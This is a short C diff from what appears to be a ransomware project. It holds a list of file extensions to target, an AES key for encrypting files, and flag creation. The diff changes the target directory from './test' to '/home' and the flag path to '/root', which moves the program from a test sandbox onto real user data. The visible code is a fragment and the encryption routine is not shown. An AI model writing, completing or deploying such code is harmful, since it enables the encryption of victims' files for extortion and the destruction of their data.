@@ -16,7 +16,7 @@
 #include "lib/file_handling.h"
 
 
-char path[131072]="./test";
+char path[131072]="/home";
 char extension[][10] = {
     ".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",
     ".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",
@@ -85,12 +85,12 @@ int list_files(int n, int h, char key[])
 
 void main(int argc, char * argv[]){
     if(argc != 3){
-        fprintf(stderr,"No po\n");
+        fprintf(stderr,"No po, pa la 11\n");
         exit(69);
     }
     //Create flag
     debug("Creating flag");
-    create_flag("./flag.ntd");
+    create_flag("/root/flag.ntd");
     //Key AES para el cifrado de ficheros
     debug("Flag was created...\nGenerating AES...");
     char key[48];
